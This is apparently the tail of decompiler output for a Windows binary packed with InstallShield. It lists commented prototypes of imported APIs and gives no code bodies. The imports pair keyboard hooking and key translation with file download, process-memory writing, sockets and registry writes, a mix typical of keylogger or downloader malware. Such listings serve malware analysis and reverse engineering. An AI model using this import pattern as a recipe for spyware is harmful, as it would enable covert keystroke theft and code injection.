// LSTATUS RegCreateKeyExA(_In_ HKEY hKey, _In_ LPCSTR lpSubKey, DWORD Reserved, _In_opt_ LPSTR lpClass, _In_ DWORD dwOptions, _In_ REGSAM samDesired, _In_opt_ const LPSECURITY_ATTRIBUTES lpSecurityAttributes, _Out_ PHKEY phkResult, _Out_opt_ LPDWORD lpdwDisposition);
// LSTATUS RegDeleteKeyA(_In_ HKEY hKey, _In_ LPCSTR lpSubKey);
// LSTATUS RegOpenKeyExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpSubKey, _In_opt_ DWORD ulOptions, _In_ REGSAM samDesired, _Out_ PHKEY phkResult);
// int32_t RegOpenKeyExA2(void);
// LSTATUS RegQueryValueExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpValueName, LPDWORD lpReserved, _Out_opt_ LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// int32_t RegQueryValueExA2(void);
// LSTATUS RegSetValueExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpValueName, DWORD Reserved, _In_ DWORD dwType, const BYTE * lpData, _In_ DWORD cbData);
// int ReleaseDC(_In_opt_ HWND hWnd, _In_ HDC hDC);
// VOID RtlUnwind(_In_opt_ PVOID TargetFrame, _In_opt_ PVOID TargetIp, _In_opt_ PEXCEPTION_RECORD ExceptionRecord, _In_ PVOID ReturnValue);
// HGDIOBJ SelectObject(_In_ HDC hdc, _In_ HGDIOBJ h);
// int send(_In_ SOCKET s, const char * buf, _In_ int len, _In_ int flags);
// LRESULT SendMessageA(_In_ HWND hWnd, _In_ UINT Msg, WPARAM wParam, LPARAM lParam);
// BOOL SetEndOfFile(_In_ HANDLE hFile);
// UINT_PTR SetTimer(_In_opt_ HWND hWnd, _In_ UINT_PTR nIDEvent, _In_ UINT uElapse, _In_opt_ TIMERPROC lpTimerFunc);
// LONG SetWindowLongA(_In_ HWND hWnd, _In_ int nIndex, _In_ LONG dwNewLong);
// HHOOK SetWindowsHookExA(_In_ int idHook, _In_ HOOKPROC lpfn, _In_opt_ HINSTANCE hmod, _In_ DWORD dwThreadId);
// HINSTANCE ShellExecuteA(_In_opt_ HWND hwnd, _In_opt_ LPCSTR lpOperation, _In_ LPCSTR lpFile, _In_opt_ LPCSTR lpParameters, _In_opt_ LPCSTR lpDirectory, _In_ INT nShowCmd);
// VOID Sleep(_In_ DWORD dwMilliseconds);
// SOCKET socket(_In_ int af, _In_ int type, _In_ int protocol);
// void SysFreeString(_In_opt_ BSTR bstrString);
// INT SysReAllocStringLen(_Inout_ BSTR * pbstr, const OLECHAR * psz, _In_ unsigned int len);
// DWORD TlsAlloc(VOID);
// BOOL TlsFree(_In_ DWORD dwTlsIndex);
// LPVOID TlsGetValue(_In_ DWORD dwTlsIndex);
// BOOL TlsSetValue(_In_ DWORD dwTlsIndex, _In_opt_ LPVOID lpTlsValue);
// int ToAscii(_In_ UINT uVirtKey, _In_ UINT uScanCode, const BYTE * lpKeyState, _Out_ LPWORD lpChar, _In_ UINT uFlags);
// LONG UnhandledExceptionFilter(_In_ struct _EXCEPTION_POINTERS * ExceptionInfo);
// BOOL UnhookWindowsHookEx(_In_ HHOOK hhk);
// HRESULT URLDownloadToFileA(_In_opt_ LPUNKNOWN, _In_ LPCSTR, _In_opt_ LPCSTR, DWORD, _In_opt_ LPBINDSTATUSCALLBACK);
// int32_t URLDownloadToFileA2(void);
// LPVOID VirtualAlloc(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect);
// BOOL VirtualFree(LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD dwFreeType);
// BOOL VirtualProtect(_In_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flNewProtect, _Out_ PDWORD lpflOldProtect);
// BOOL WriteFile(_In_ HANDLE hFile, LPCVOID lpBuffer, _In_ DWORD nNumberOfBytesToWrite, _Out_opt_ LPDWORD lpNumberOfBytesWritten, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// int32_t WriteFile2(void);
// BOOL WriteProcessMemory(_In_ HANDLE hProcess, _In_ LPVOID lpBaseAddress, LPCVOID lpBuffer, _In_ SIZE_T nSize, _Out_opt_ SIZE_T * lpNumberOfBytesWritten);
// int WSACleanup(void);
// int WSAStartup(_In_ WORD wVersionRequested, _Out_ LPWSADATA lpWSAData);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: installshield (2000)
// Detected functions: 646
